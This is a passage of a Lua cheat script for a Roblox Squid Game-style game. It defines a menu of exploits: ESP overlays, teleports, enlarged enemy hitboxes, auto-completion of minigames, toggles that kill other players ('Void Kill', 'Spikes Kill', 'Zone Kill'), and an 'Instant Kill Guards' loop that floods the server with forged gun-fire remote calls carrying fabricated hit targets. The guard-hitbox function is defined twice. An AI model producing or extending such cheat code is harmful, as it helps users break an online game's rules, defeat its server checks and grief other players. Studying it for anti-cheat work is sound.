                if ToggleRefs.AutoGonggi then
                    pcall(function() ToggleRefs.AutoGonggi:SetValue(false) end)
                end
                MainModule.ToggleAutoGonggi(false)
            end
        end)
        
        MainModule.Notify("AutoGonggi", "Enabled", 0.9)
        PlayToggleSound()
    else
        task.spawn(function()
            local pentathlonMap = workspace:FindFirstChild("PentathlonMap")
            if pentathlonMap then
                for _, obj in pairs(pentathlonMap:GetDescendants()) do
                    if obj:IsA("BasePart") and obj:FindFirstChild("AutoHighlight") then
                        obj.AutoHighlight:Destroy()
                    end
                end
            end
            
            local collectionService = game:GetService("CollectionService")
            local stones = collectionService:GetTagged("GonggiStone")
            for _, stone in ipairs(stones) do
                if stone:IsA("BasePart") and stone:FindFirstChild("AutoHighlight") then
                    stone.AutoHighlight:Destroy()
                end
            end
        end)
        MainModule.Notify("AutoGonggi", "Disabled", 0.9)
        PlayToggleSound()
    end
    
    return MainModule.AutoGonggi.Enabled
end

function MainModule.ForceStopAutoGonggi()
    MainModule.ToggleAutoGonggi(false)
end

DalgonaGroup:AddButton("Max Ddakji Strength", function()
    MainModule.MaxDdakjiStrength()
end, {Tooltip = "Maximum throw power in Ddakji"})

DalgonaGroup:AddButton("Perfect Stone Hit", function()
    MainModule.PerfectStoneHit()
end, {Tooltip = "Perfect throw for Flying Stone"})

local autoGonggiToggle = DalgonaGroup:AddToggle("AutoGonggi", {
    Text = "Auto Gonggi",
    Default = false,
    Tooltip = "Automatically completes Gonggi QTE and stones",
    Callback = function(value)
        MainModule.ToggleAutoGonggi(value)
    end
})

HNSLeft:AddButton("Teleport To Spawn", MainModule.TeleportToSpawn, {Tooltip = "Teleport to spawn location"})
ToggleRefs.AutoEscape = HNSLeft:AddToggle("AutoEscape", {Text="Auto Escape", Default=false, Callback=MainModule.ToggleAutoEscape, Tooltip = "Automatically teleports to every dropped keys and after to escape door and automatically escapes"})
ToggleRefs.AutoPickup = HNSLeft:AddToggle("AutoPickupKeys", {Text="Auto Pickup Keys", Default=false, Callback=MainModule.ToggleAutoPickup, Tooltip = "Automatically teleports to all dropped keys for hider"})
ToggleRefs.KeyESP = HNSLeft:AddToggle("KeyESP", {Text="ESP Dropped Keys", Default=false, Callback=MainModule.ToggleKeyESP, Tooltip = "Shows all dropped keys for hider"})

local exitDoorESPToggle = HNSLeft:AddToggle("ExitDoorESP", {Text="ESP Exit Doors", Default=false, Callback=MainModule.ToggleExitDoorESP, Tooltip = "Shows all exit doors"})

ToggleRefs.AutoDodge = HNSLeft:AddToggle("AutoDodge", {Text="Auto Dodge", Default=false, Callback=MainModule.ToggleAutoDodge, Tooltip = "Automatically uses DODGE! when being attacked, You need to use DODGE! before enable"})
ToggleRefs.AutoDodge:AddKeyPicker("AutoDodge", {
    Default = nil,
    Mode = "Toggle",
    Text = "Auto Dodge",
    Callback = function(value)
        MainModule.ToggleAutoDodge(value)
        if ToggleRefs.AutoDodge then
            ToggleRefs.AutoDodge:SetValue(value)
        end
    end
})

ToggleRefs.SpikesKill = HNSLeft:AddToggle("SpikesKill", {Text="Spikes Kill", Default=false, Callback=MainModule.ToggleSpikesKill, Tooltip = "Teleport players to spikes by animation"})

ToggleRefs.SpikesPlatformTeleport = HNSLeft:AddToggle("SpikesPlatformTeleport", {Text="Teleport To Spikes", Default=false, Callback=MainModule.ToggleSpikesPlatformTeleport, Tooltip = "Teleports you to random spikes, to prevent die you need to disable spikes first"})
ToggleRefs.SpikesPlatformTeleport:AddKeyPicker("Teleport To Spikes", {
    Default = nil,
    Mode = "Toggle",
    Text = "Teleport To Spikes",
    Callback = function(value)
        MainModule.ToggleSpikesPlatformTeleport(value)
        if ToggleRefs.SpikesPlatformTeleport then
            ToggleRefs.SpikesPlatformTeleport:SetValue(value)
        end
    end
})

HNSLeft:AddButton("Teleport Random Exit", MainModule.TeleportRandomExit, {Tooltip = "Teleports to a random exit door"})

HNSLeft:AddButton("Delete Spikes", MainModule.DeleteSpikes, {Tooltip = "Deletes spikes in HideAndSeek map"})

local teleportToHiderButton = HNSLeft:AddButton("Teleport to Hider", MainModule.TeleportToHider, {Tooltip = "Teleports you to nearest hider"})

local teleportToSeekerButton = HNSLeft:AddButton("Teleport to Seeker", MainModule.TeleportToSeeker, {Tooltip = "Teleports you to nearest seeker"})

local hiderLabel = HNSLeft:AddLabel("Keybind for TP hider:")
hiderLabel:AddKeyPicker("Teleport To Hider", {
    Default = nil,
    Mode = "Toggle",
    Text = "Teleport to Hider",
    Callback = function()
        MainModule.TeleportToHider()
    end
})

local seekerLabel = HNSLeft:AddLabel("Keybind for TP seeker:")
seekerLabel:AddKeyPicker("Teleport To Seeker", {
    Default = nil,
    Mode = "Press",
    Text = "Teleport To Seeker",
    Callback = function()
        MainModule.TeleportToSeeker()
    end
})

ToggleRefs.TugOfWarAutoQTEMiss = TugLeft:AddToggle("TugOfWarAutoQTEMiss", {
    Text = "Anti Miss",
    Default = false,
    Callback = MainModule.ToggleTugOfWarAutoQTEMiss,
    Tooltip = "u cant lose, u need just click to win"
})

ToggleRefs.JumpRopeAntiFall = JumpLeft:AddToggle("AntiFall", {Text="Anti Fall", Default=false, Callback=MainModule.ToggleJumpRopeAntiFall, Tooltip = "Creates invisible platform to prevent falling"})

ToggleRefs.JumpRopeAntiHit = JumpLeft:AddToggle("JumpRopeAntiHit", {
    Text = "AntiHit", 
    Default = false, 
    Tooltip = "Removes rope hits",
    Callback = MainModule.ToggleJumpRopeAntiHit
})

ToggleRefs.JumpRopeFakeBalance = JumpLeft:AddToggle("JumpRopeFakeBalance", {
    Text = "Fake Balance", 
    Default = false, 
    Tooltip = "Adds landing animation when jumping",
    Callback = MainModule.ToggleJumpRopeFakeBalance
})
ToggleRefs.FreezeRope = JumpLeft:AddToggle("FreezeRope", {
    Text = "Freeze Rope",
    Default = false,
    Tooltip = "Freezes or unfreezes the rope physically",
    Callback = MainModule.ToggleFreezeRope
})
JumpLeft:AddButton("Remove Balance Mini Game", MainModule.RemoveBalanceMiniGame, {Tooltip = "Removes the balance attribute to skip the mini-game"})
JumpLeft:AddButton("Remove Rope", MainModule.JR_DeleteRope, {Tooltip = "Deletes rope object in JumpRope game"})
JumpLeft:AddButton("Teleport to Start", MainModule.JR_TP_Start, {Tooltip = "Teleports you to start of JumpRope"})
JumpLeft:AddButton("Teleport to End", MainModule.JR_TP_End, {Tooltip = "Teleports you to end of JumpRope"})

ToggleRefs.GlassESP = GlassLeft:AddToggle("GlassESP", {Text="Glass ESP", Default=false, Callback=MainModule.ToggleGlassESP, Tooltip = "Green = safe, Red = breakable, soon will be esp for delayed glass"})
GlassLeft:AddSlider("GlassESPTransparency", {Text="Glass ESP Transparency", Default=40, Min=0, Max=100, Callback=MainModule.SetGlassESPTransparency, Tooltip = "Set custom glass transparency"})
ToggleRefs.AntiBreak = GlassLeft:AddToggle("AntiBreak", {Text="Anti-Break", Default=false, Callback=MainModule.ToggleAntiBreak, Tooltip = "Prevents glass for breaking"})
GlassLeft:AddButton("Teleport to End", MainModule.GB_TP_End, {Tooltip = "Teleports you to end of GlassBridge"})
ToggleRefs.HCGlassESP = GlassLeft:AddToggle("HCGlassESP", {
    Text = "HC Glass ESP",
    Default = false,
    Tooltip = "Highlights GlassBridge tiles (Green = Safe, Red = Breakable) THIS TOGGLE FOR HARDCORE SERVERS! DONT ENABLE NORMAL GLASS ESP BECAUSE THIS WILL NOT WORK AFTER THIS",
    Callback = MainModule.ToggleHCGlassESP
})

ToggleRefs.MingleVoidKill = MingleGroup:AddToggle("VoidKill", {Text="Void Kill", Default=false, Callback=MainModule.ToggleMingleVoidKill, Tooltip = "Kills players with void in Mingle"})

MainModule.TeleportToSafeSpot = function()
    if MainModule.IsGameActive("LastDinner") then
        MainModule.SafeTeleport(Vector3.new(0, 100, 0))
        MainModule.Notify("Last Dinner", "Teleported to Safe Spot", 0.9)
    else
        MainModule.Notify("Last Dinner", "Wait for LastDinner!", 0.9)
        PlayErrorSound()
    end
    PlayBell()
end

ToggleRefs.ZoneKill = DinnerGroup:AddToggle("ZoneKill", {Text="Zone Kill", Default=false, Callback=MainModule.ToggleZoneKill, Tooltip = "Kills player with stabbing knife animation"})
DinnerGroup:AddButton("Teleport To Safe Spot", MainModule.TeleportToSafeSpot, {Tooltip = "Teleports you to safe spot in LastDinner"})

MainModule.RebelEnabled = false
MainModule.RebelShotsPerTick = 10
MainModule.RebelConnection = nil

local function StartRebelLoop()
    if MainModule.RebelConnection then
        MainModule.RebelConnection:Disconnect()
        MainModule.RebelConnection = nil
    end

    MainModule.RebelConnection = RunService.RenderStepped:Connect(function()
        if not MainModule.RebelEnabled then return end
        
        local char = MainModule.GetCharacter()
        local backpack = LocalPlayer:FindFirstChild("Backpack")
        local gun = nil
        
        if char then
            for _, tool in ipairs(char:GetChildren()) do
                if tool:IsA("Tool") and (tool:GetAttribute("Gun") or tool:FindFirstChild("GunScript") or string.lower(tool.Name):find("gun")) then
                    gun = tool
                    break
                end
            end
        end
        
        if not gun and backpack then
            for _, tool in ipairs(backpack:GetChildren()) do
                if tool:IsA("Tool") and (tool:GetAttribute("Gun") or tool:FindFirstChild("GunScript") or string.lower(tool.Name):find("gun")) then
                    gun = tool
                    break
                end
            end
        end
        
        if not gun then return end

        local hitTargetsTable = {}
        if workspace:FindFirstChild("Live") then
            for _, enemy in ipairs(workspace.Live:GetChildren()) do
                if enemy:IsA("Model") and enemy:FindFirstChild("Enemy") and not enemy:FindFirstChild("Dead") then
                    local isPlayer = false
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Name == enemy.Name then
                            isPlayer = true
                            break
                        end
                    end
                    if not isPlayer then
                        hitTargetsTable[enemy.Name] = "Head"
                    end
                end
            end
        end

        if next(hitTargetsTable) ~= nil then
            local remotes = ReplicatedStorage:FindFirstChild("Remotes")
            if remotes then
                local remote = remotes:FindFirstChild("FiredGunClient")
                if remote then
                    local rayInst = workspace:FindFirstChild("StairWalkWay") and workspace.StairWalkWay:FindFirstChild("Part") or workspace
                    
                    local args = {
                        gun,
                        {
                            ClientRayNormal = Vector3.new(0, 1, 0),
                            FiredGun = true,
                            SecondaryHitTargets = {},
                            ClientRayInstance = rayInst,
                            ClientRayPosition = Vector3.new(0, 0, 0),
                            bulletCF = CFrame.new(),
                            HitTargets = hitTargetsTable,
                            bulletSizeC = Vector3.new(0.01, 0.01, 5),
                            NoMuzzleFX = true,
                            FirePosition = Vector3.new(0, 0, 0)
                        }
                    }
                    
                    for _ = 1, MainModule.RebelShotsPerTick do
                        pcall(function()
                            remote:FireServer(unpack(args))
                        end)
                    end
                end
            end
        end
    end)
end

function MainModule.ToggleRebelV2(enabled)
    MainModule.RebelEnabled = enabled
    
    if MainModule.RebelConnection then
        MainModule.RebelConnection:Disconnect()
        MainModule.RebelConnection = nil
    end
    
    if enabled then
        StartRebelLoop()
        Library:Notify({Title = "Instant Kill Guards", Description = "Enabled. Make sure your gun equipped", Duration = 0.9})
    else
        Library:Notify({Title = "Instant Kill Guards", Description = "Disabled", Duration = 0.9})
    end
    PlayToggleSound()
end

function MainModule.SetRebelShotsPerTick(value)
    MainModule.RebelShotsPerTick = value
end
ToggleRefs.AutoKillGuards = RebelGroup:AddToggle("AutoKillGuards", {Text="Auto Kill Guards", Default=false, Callback=MainModule.ToggleRebel, Tooltip = "Automatically kills everyone NPCS Guards, you need to equip MP5 first"})
ToggleRefs.RebelV2 = RebelGroup:AddToggle("RebelV2", {
    Text = "Instant Kill Guards",
    Default = false,
    Callback = MainModule.ToggleRebelV2,
    Tooltip = "Automatically kills all NPC Guards. Requires a gun equipped. Works much faster than V1."
})

RebelGroup:AddSlider("RebelShotsPerTick", {
    Text = "Shots Per Tick",
    Default = 10,
    Min = 1,
    Max = 50,
    Rounding = 0,
    Callback = MainModule.SetRebelShotsPerTick,
    Tooltip = "How many shots to fire per game tick (higher = faster kills) (version v2)"
})
MainModule.GuardHitboxEnabled = false
MainModule.GuardHitboxConnection = nil
MainModule.GuardHitboxSize = 4.5
MainModule.GuardOriginalSizes = {}
MainModule.GuardESPObjects = {}

function MainModule.ToggleGuardHitbox(enabled)
    MainModule.GuardHitboxEnabled = enabled
    
    local function restoreAllHitboxes()
        for part, originalSize in pairs(MainModule.GuardOriginalSizes) do
            if part and part.Parent then
                pcall(function() 
                    part.Size = originalSize 
                end)
            end
        end
        MainModule.GuardOriginalSizes = {}
        
        for _, esp in pairs(MainModule.GuardESPObjects) do
            pcall(function() esp.Highlight:Destroy() end)
            pcall(function() esp.Billboard:Destroy() end)
        end
        MainModule.GuardESPObjects = {}
    end
    
    if enabled then
        if MainModule.GuardHitboxConnection then
            MainModule.GuardHitboxConnection:Disconnect()
        end
        
        MainModule.GuardHitboxConnection = RunService.RenderStepped:Connect(function()
            if not MainModule.GuardHitboxEnabled then return end
            
            local liveFolder = workspace:FindFirstChild("Live")
            local myCharacter = LocalPlayer.Character
            
            local currentGuards = {}
            
            if liveFolder then
                for _, model in ipairs(liveFolder:GetChildren()) do
                    if model:IsA("Model") and model:FindFirstChild("Humanoid") then
                        if model == myCharacter then continue end
                        
                        local isPlayer = false
                        for _, plr in pairs(Players:GetPlayers()) do
                            if plr.Name == model.Name then
                                isPlayer = true
                                break
                            end
                        end
                        
                        if isPlayer then continue end
                        
                        local humanoid = model:FindFirstChildOfClass("Humanoid")
                        local despawn = model:GetAttribute("BodyDespawntime")
                        
                        if humanoid and humanoid.Health > 0 and not despawn then
                            currentGuards[model] = true
                            
                            local rootPart = model:FindFirstChild("HumanoidRootPart")
                            if rootPart and rootPart:IsA("BasePart") then
                                if not MainModule.GuardOriginalSizes[rootPart] then
                                    MainModule.GuardOriginalSizes[rootPart] = rootPart.Size
                                end
                                
                                rootPart.Size = Vector3.new(MainModule.GuardHitboxSize, MainModule.GuardHitboxSize, MainModule.GuardHitboxSize)
                                
                                if not MainModule.GuardESPObjects[model] then
                                    local highlight = Instance.new("Highlight")
                                    highlight.FillTransparency = 0.85
                                    highlight.OutlineTransparency = 0.2
                                    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                                    highlight.Parent = CoreGui
                                    
                                    local bill = Instance.new("BillboardGui")
                                    bill.Size = UDim2.new(0, 140, 0, 45)
                                    bill.StudsOffset = Vector3.new(0, 2.5, 0)
                                    bill.AlwaysOnTop = true
                                    bill.Parent = CoreGui
                                    
                                    local name = Instance.new("TextLabel")
                                    name.Size = UDim2.new(1, 0, 0.45, 0)
                                    name.BackgroundTransparency = 1
                                    name.TextSize = 11
                                    name.Font = Enum.Font.GothamBold
                                    name.TextStrokeTransparency = 0.2
                                    name.TextXAlignment = Enum.TextXAlignment.Left
                                    name.Text = "GUARD"
                                    name.Parent = bill
                                    
                                    local hpBg = Instance.new("Frame")
                                    hpBg.Size = UDim2.new(0.45, 0, 0.07, 0)
                                    hpBg.Position = UDim2.new(0, 0, 0.48, 0)
                                    hpBg.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
                                    hpBg.BorderSizePixel = 0
                                    hpBg.Parent = bill
                                    
                                    local corner = Instance.new("UICorner")
                                    corner.CornerRadius = UDim.new(0, 3)
                                    corner.Parent = hpBg
                                    
                                    local hpFill = Instance.new("Frame")
                                    hpFill.Size = UDim2.new(1, 0, 1, 0)
                                    hpFill.BackgroundColor3 = Color3.fromRGB(130, 230, 160)
                                    hpFill.BorderSizePixel = 0
                                    hpFill.Parent = hpBg
                                    
                                    local fillCorner = Instance.new("UICorner")
                                    fillCorner.CornerRadius = UDim.new(0, 3)
                                    fillCorner.Parent = hpFill
                                    
                                    MainModule.GuardESPObjects[model] = {
                                        Highlight = highlight,
                                        Billboard = bill,
                                        Name = name,
                                        HpFill = hpFill
                                    }
                                end
                                
                                local data = MainModule.GuardESPObjects[model]
                                local guardColor = Color3.fromRGB(255, 80, 100)
                                
                                data.Highlight.Adornee = model
                                data.Highlight.FillColor = guardColor
                                data.Highlight.OutlineColor = guardColor
                                data.Highlight.Enabled = true
                                
                                data.Billboard.Adornee = rootPart
                                data.Billboard.Enabled = true
                                data.Name.TextColor3 = guardColor
                                
                                local hpPercent = humanoid.Health / humanoid.MaxHealth
                                data.HpFill.Size = UDim2.new(hpPercent, 0, 1, 0)
                                
                                if hpPercent > 0.6 then
                                    data.HpFill.BackgroundColor3 = Color3.fromRGB(130, 230, 160)
                                elseif hpPercent > 0.3 then
                                    data.HpFill.BackgroundColor3 = Color3.fromRGB(255, 200, 100)
                                else
                                    data.HpFill.BackgroundColor3 = Color3.fromRGB(245, 130, 130)
                                end
                            end
                        end
                    end
                end
            end
            
            for model, data in pairs(MainModule.GuardESPObjects) do
                if not currentGuards[model] then
                    pcall(function() 
                        data.Highlight.Enabled = false
                        data.Billboard.Enabled = false
                    end)
                end
            end
        end)
        
    else
        if MainModule.GuardHitboxConnection then
            MainModule.GuardHitboxConnection:Disconnect()
            MainModule.GuardHitboxConnection = nil
        end
        restoreAllHitboxes()
    end
    PlayToggleSound()
    return true
end

function MainModule.SetGuardHitboxSize(size)
    MainModule.GuardHitboxSize = size
end

ToggleRefs.InfiniteAmmoRebel = RebelGroup:AddToggle("InfiniteAmmoRebel", {Text="Infinite Ammo", Default=false, Callback=MainModule.ToggleInfiniteAmmo, Tooltip = "Infinite bullets for MP5"})
ToggleRefs.RapidFireRebel = RebelGroup:AddToggle("RapidFireRebel", {Text="Rapid Fire", Default=false, Callback=MainModule.ToggleRapidFire, Tooltip = "Infinite fire rate for MP5"})

MainModule.GuardHitboxEnabled = false
MainModule.GuardHitboxConnection = nil
MainModule.GuardHitboxSize = 4.5
MainModule.GuardOriginalSizes = {}
MainModule.GuardESPObjects = {}

function MainModule.ToggleGuardHitbox(enabled)
    MainModule.GuardHitboxEnabled = enabled
    
    local function restoreAllHitboxes()
        for part, originalSize in pairs(MainModule.GuardOriginalSizes) do
            if part and part.Parent then
                pcall(function() 
                    part.Size = originalSize 
                    part.Transparency = 1
                    part.CanCollide = true
                    part.Color = Color3.fromRGB(255, 255, 255)
                    part.Material = Enum.Material.Plastic
                end)
            end
        end
        MainModule.GuardOriginalSizes = {}
        
        for _, esp in pairs(MainModule.GuardESPObjects) do
            pcall(function() 
                if esp.Highlight then esp.Highlight:Destroy() end
                if esp.Billboard then esp.Billboard:Destroy() end
            end)
        end
        MainModule.GuardESPObjects = {}
    end
    
    if enabled then
        if MainModule.GuardHitboxConnection then
            MainModule.GuardHitboxConnection:Disconnect()
        end
        
        MainModule.GuardHitboxConnection = RunService.RenderStepped:Connect(function()
            if not MainModule.GuardHitboxEnabled then return end
            
            local liveFolder = workspace:FindFirstChild("Live")
            if not liveFolder then return end
            
            local currentGuards = {}
            
            for _, model in ipairs(liveFolder:GetChildren()) do
                if model:IsA("Model") and model:FindFirstChild("Humanoid") then
                    local isPlayer = false
                    for _, plr in pairs(Players:GetPlayers()) do
                        if plr.Name == model.Name then
                            isPlayer = true
                            break
                        end
                    end
                    
                    if isPlayer then continue end
                    
                    local humanoid = model:FindFirstChildOfClass("Humanoid")
                    local despawn = model:GetAttribute("BodyDespawntime")
                    
                    if humanoid and humanoid.Health > 0 and not despawn then
                        currentGuards[model] = true
                        
                        local rootPart = model:FindFirstChild("HumanoidRootPart")
                        if rootPart and rootPart:IsA("BasePart") then
                            if not MainModule.GuardOriginalSizes[rootPart] then
                                MainModule.GuardOriginalSizes[rootPart] = rootPart.Size
                            end
                            
                            rootPart.Size = Vector3.new(MainModule.GuardHitboxSize, MainModule.GuardHitboxSize, MainModule.GuardHitboxSize)
                            rootPart.Transparency = 0.4
                            rootPart.Color = Color3.fromRGB(255, 100, 100)
                            rootPart.Material = Enum.Material.Neon
                            rootPart.CanCollide = false
                            
                            if not MainModule.GuardESPObjects[model] then
                                local highlight = Instance.new("Highlight")
                                highlight.FillTransparency = 0.75
                                highlight.OutlineTransparency = 0.15
                                highlight.FillColor = Color3.fromRGB(255, 100, 100)
                                highlight.OutlineColor = Color3.fromRGB(255, 100, 100)
                                highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                                highlight.Parent = CoreGui
                                
                                local bill = Instance.new("BillboardGui")
                                bill.Size = UDim2.new(0, 130, 0, 40)
                                bill.StudsOffset = Vector3.new(0, 2.5, 0)
                                bill.AlwaysOnTop = true
                                bill.Parent = CoreGui
                                
                                local name = Instance.new("TextLabel")
                                name.Size = UDim2.new(1, 0, 0.5, 0)
                                name.BackgroundTransparency = 1
                                name.TextSize = 11
                                name.Font = Enum.Font.GothamBold
                                name.TextStrokeTransparency = 0.2
                                name.TextColor3 = Color3.fromRGB(255, 100, 100)
                                name.Text = "Guard"
                                name.TextXAlignment = Enum.TextXAlignment.Center
                                name.Parent = bill
                                
                                local hpBg = Instance.new("Frame")
                                hpBg.Size = UDim2.new(0.5, 0, 0.1, 0)
                                hpBg.Position = UDim2.new(0.25, 0, 0.65, 0)
                                hpBg.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
                                hpBg.BorderSizePixel = 0
                                hpBg.Parent = bill
                                
                                local corner = Instance.new("UICorner")
                                corner.CornerRadius = UDim.new(0, 2)
                                corner.Parent = hpBg
                                
                                local hpFill = Instance.new("Frame")
                                hpFill.Size = UDim2.new(1, 0, 1, 0)
                                hpFill.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
                                hpFill.BorderSizePixel = 0
                                hpFill.Parent = hpBg
                                
                                local fillCorner = Instance.new("UICorner")
                                fillCorner.CornerRadius = UDim.new(0, 2)
                                fillCorner.Parent = hpFill
                                
                                MainModule.GuardESPObjects[model] = {
                                    Highlight = highlight,
                                    Billboard = bill,
                                    Name = name,
                                    HpFill = hpFill
                                }
                            end
                            
                            local data = MainModule.GuardESPObjects[model]
                            
                            data.Highlight.Adornee = model
                            data.Billboard.Adornee = rootPart
                            
                            local hpPercent = humanoid.Health / humanoid.MaxHealth
                            data.HpFill.Size = UDim2.new(hpPercent, 0, 1, 0)
                            
                            if hpPercent > 0.6 then
                                data.HpFill.BackgroundColor3 = Color3.fromRGB(100, 220, 140)
                            elseif hpPercent > 0.3 then
                                data.HpFill.BackgroundColor3 = Color3.fromRGB(255, 180, 80)
                            else
                                data.HpFill.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
                            end
                        end
                    end
                end
            end
            
            for model, data in pairs(MainModule.GuardESPObjects) do
                if not currentGuards[model] then
                    pcall(function() 
                        if data.Highlight then data.Highlight:Destroy() end
                        if data.Billboard then data.Billboard:Destroy() end
                    end)
                    MainModule.GuardESPObjects[model] = nil
                end
            end
        end)
        
    else
        if MainModule.GuardHitboxConnection then
            MainModule.GuardHitboxConnection:Disconnect()
            MainModule.GuardHitboxConnection = nil
        end
        restoreAllHitboxes()
    end
    PlayToggleSound()
    return true
end

function MainModule.SetGuardHitboxSize(size)
    MainModule.GuardHitboxSize = size
    if MainModule.GuardHitboxEnabled then
        for model, data in pairs(MainModule.GuardESPObjects) do
            local rootPart = model and model:FindFirstChild("HumanoidRootPart")
            if rootPart then
                rootPart.Size = Vector3.new(size, size, size)
            end
        end
    end
end

ToggleRefs.GuardHitbox = RebelGroup:AddToggle("GuardHitbox", {Text="Hitbox + ESP Guards", Default=false, Callback=MainModule.ToggleGuardHitbox, Tooltip = "Shows NPCS Guards (pink) also you can set hitbox size below"})
RebelGroup:AddSlider("GuardHitboxSize", {Text="Guard Hitbox Size", Default=30, Min=1, Max=1000, Callback=MainModule.SetGuardHitboxSize, Tooltip = "Increase NPCS Guards hitbox size"})

ToggleRefs.AutoRespawnOnFall = SquidLeft:AddToggle("AutoRespawnOnFall", {
    Text = "Auto Teleport on Fall",
    Default = false,
    Callback = MainModule.ToggleAutoRespawnOnFall,
    Tooltip = "idk"
})
ToggleRefs.VoidKill = SquidLeft:AddToggle("VoidKill", {
    Text = "Void Kill", 
    Default = false, 
    Callback = MainModule.ToggleVoidKill,
    Tooltip = "void kill"
})
ToggleRefs.SkySquidAntiFall = SquidLeft:AddToggle("AntiFall", {Text="Anti Fall", Default=false, Callback=MainModule.ToggleSkySquidAntiFall, Tooltip = "Creates invisible platform to prevent falling"})

local PlayersStatsGroup = PlayersTab:AddLeftGroupbox("Players Stats", "chart-bar")

local selectedPlayer = nil

local winsLabel = PlayersStatsGroup:AddLabel("Wins: -")
local moneyLabel = PlayersStatsGroup:AddLabel("Money: -")
local powerLabel = PlayersStatsGroup:AddLabel("Equipped Power: -")
local guardLabel = PlayersStatsGroup:AddLabel("Guard Power: -")
local levelLabel = PlayersStatsGroup:AddLabel("Level: -")
local powerSpinsLabel = PlayersStatsGroup:AddLabel("Power Spins: -")
local guardPowerSpinsLabel = PlayersStatsGroup:AddLabel("Guard Spins: -")
local robuxDonatedLabel = PlayersStatsGroup:AddLabel("Bobux Donated: -")

PlayersStatsGroup:AddDivider()

local vipLabel = PlayersStatsGroup:AddLabel("VIP: -")
local glassVisionLabel = PlayersStatsGroup:AddLabel("Glass Manufact vision: -")
local doubleVoteLabel = PlayersStatsGroup:AddLabel("2x vote: -")
local permGuardLabel = PlayersStatsGroup:AddLabel("Perm Guard: -")
local lighterLabel = PlayersStatsGroup:AddLabel("Lighter: -")

PlayersStatsGroup:AddDivider()

local fasterSprintLabel = PlayersStatsGroup:AddLabel("Faster Sprint: -")
local damageBoostLabel = PlayersStatsGroup:AddLabel("Strenght Boost: -")
local wonBoostLabel = PlayersStatsGroup:AddLabel("Won Boost: -")

local function formatNumberWithCommas(num)
    if num == "-" or num == nil then return "-" end
    if type(num) ~= "number" then
        num = tonumber(num) or 0
    end
    local formatted = tostring(math.floor(num))
    local k = formatted:reverse():gsub("(%d%d%d)", "%1,"):reverse()
    if k:sub(1,1) == "," then k = k:sub(2) end
    return k
end

local function getBoostFromAllSources(player, boostName)
    local checkFolder = function(folder)
        if folder then
            for _, child in pairs(folder:GetChildren()) do
                if child.Name == boostName and (child:IsA("NumberValue") or child:IsA("IntValue")) then
                    return child.Value
                end
                if string.lower(child.Name):find(string.lower(boostName)) and (child:IsA("NumberValue") or child:IsA("IntValue")) then
                    return child.Value
                end
            end
        end
        return nil
    end
    
    local boosts = player:FindFirstChild("Boosts")
    if boosts then
        local val = checkFolder(boosts)
        if val then return val end
    end
    
    local boostData = player:FindFirstChild("_BoostData")
    if boostData then
        local val = checkFolder(boostData)
        if val then return val end
    end
    
    local liveFolder = workspace:FindFirstChild("Live")
    if liveFolder then
        local playerFolder = liveFolder:FindFirstChild(player.Name)
        if playerFolder then
            local boostsLive = playerFolder:FindFirstChild("Boosts")
            if boostsLive then
                local val = checkFolder(boostsLive)
                if val then return val end
            end
            local boostDataLive = playerFolder:FindFirstChild("_BoostData")
            if boostDataLive then
                local val = checkFolder(boostDataLive)
                if val then return val end
            end
        end
    end
    
    local attrs = player:GetAttributes()
    for name, val in pairs(attrs) do
        if string.lower(name):find(string.lower(boostName)) and type(val) == "number" then
            return val
        end
    end
    
    return 0
end

local function updateStatsDisplay(player)
    if not player or not player.Parent then
        winsLabel:SetVisible(false)
        moneyLabel:SetVisible(false)
        powerLabel:SetVisible(false)
        guardLabel:SetVisible(false)
        levelLabel:SetVisible(false)
        powerSpinsLabel:SetVisible(false)
        guardPowerSpinsLabel:SetVisible(false)
        robuxDonatedLabel:SetVisible(false)
        vipLabel:SetVisible(false)
        glassVisionLabel:SetVisible(false)
        doubleVoteLabel:SetVisible(false)
        permGuardLabel:SetVisible(false)
        lighterLabel:SetVisible(false)
        fasterSprintLabel:SetVisible(false)
        damageBoostLabel:SetVisible(false)
        wonBoostLabel:SetVisible(false)
        return
    end
    
    winsLabel:SetVisible(true)
    moneyLabel:SetVisible(true)
    powerLabel:SetVisible(true)
    guardLabel:SetVisible(true)
    levelLabel:SetVisible(true)
    powerSpinsLabel:SetVisible(true)
    guardPowerSpinsLabel:SetVisible(true)
    robuxDonatedLabel:SetVisible(true)
    vipLabel:SetVisible(true)
    glassVisionLabel:SetVisible(true)
    doubleVoteLabel:SetVisible(true)
    permGuardLabel:SetVisible(true)
    lighterLabel:SetVisible(true)
    fasterSprintLabel:SetVisible(true)
    damageBoostLabel:SetVisible(true)
    wonBoostLabel:SetVisible(true)
    
    local attrs = player:GetAttributes()
    
    winsLabel:SetText("Wins: " .. formatNumberWithCommas(attrs._GameWins or 0))
    moneyLabel:SetText("Money: " .. formatNumberWithCommas(attrs._Won or 0))
    powerLabel:SetText("Equipped Power: " .. tostring(attrs._EquippedPower or "-"))
    guardLabel:SetText("Guard Power: " .. tostring(attrs._EquippedGuardPower or "-"))
    levelLabel:SetText("Level: " .. tostring(attrs._CurrentLevel or 0))
    powerSpinsLabel:SetText("Power Spins: " .. formatNumberWithCommas(attrs._TotalPowerSpins or 0))
    guardPowerSpinsLabel:SetText("Guard Spins: " .. formatNumberWithCommas(attrs._TotalGuardPowerSpins or 0))
    robuxDonatedLabel:SetText("Bobux Donated: " .. formatNumberWithCommas(attrs._TotalRobuxDonated or 0))
    
    local vip = (attrs.__OwnsVIPGamepass == true) and "✓" or "No"
    local glass = (attrs.__OwnsGlassManufacturerVision == true) and "✓" or "No"
    local doubleVote = (attrs.__Owns2xVote == true) and "✓" or "No"
    local permGuard = (attrs.__OwnsPermGuard == true) and "✓" or "No"
    local lighter = (attrs.HasLighter == true) and "✓" or "No"
    
    vipLabel:SetText("VIP: " .. vip)
    glassVisionLabel:SetText("Glass Manufact vision: " .. glass)
    doubleVoteLabel:SetText("2x vote: " .. doubleVote)
    permGuardLabel:SetText("Perm Guard: " .. permGuard)
    lighterLabel:SetText("Lighter: " .. lighter)
    
    local fasterSprint = getBoostFromAllSources(player, "Faster Sprint")
    local damageBoost = getBoostFromAllSources(player, "Damage Boost")
    local wonBoost = getBoostFromAllSources(player, "Won Boost")
    
    fasterSprintLabel:SetText("Faster Sprint: " .. tostring(fasterSprint))
